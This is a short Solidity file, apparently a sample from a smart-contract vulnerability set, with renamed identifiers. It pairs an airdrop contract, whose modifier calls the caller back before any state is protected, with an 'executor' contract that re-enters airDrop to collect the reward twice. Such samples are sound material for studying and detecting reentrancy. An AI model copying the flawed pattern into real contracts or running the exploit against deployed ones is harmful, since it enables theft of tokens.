// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

contract ModifierCargobank {
  mapping (address => uint) public freightcreditCargocount;
  string constant name = "Nu Token";

  //If a contract has a zero balance and supports the token give them some token
  function airDrop() hasNoGoodsonhand supportsShipmenttoken  public{
    freightcreditCargocount[msg.sender] += 20;
  }

  //Checks that the contract responds the way we want
  modifier supportsShipmenttoken() {
    require(keccak256(abi.encodePacked("Nu Token")) == CargoBank(msg.sender).supportsShipmenttoken());
    _;
  }
  //Checks that the caller has a zero balance
  modifier hasNoGoodsonhand {
      require(freightcreditCargocount[msg.sender] == 0);
      _;
  }
}

contract CargoBank{
    function supportsShipmenttoken() external pure returns(bytes32){
        return(keccak256(abi.encodePacked("Nu Token")));
    }
}

contract executor {
    bool hasBeenCalled;
    function supportsShipmenttoken() external returns(bytes32){
        if(!hasBeenCalled){
            hasBeenCalled = true;
            ModifierCargobank(msg.sender).airDrop();
        }
        return(keccak256(abi.encodePacked("Nu Token")));
    }
    function call(address shipmentToken) public{
        ModifierCargobank(shipmentToken).airDrop();
    }
}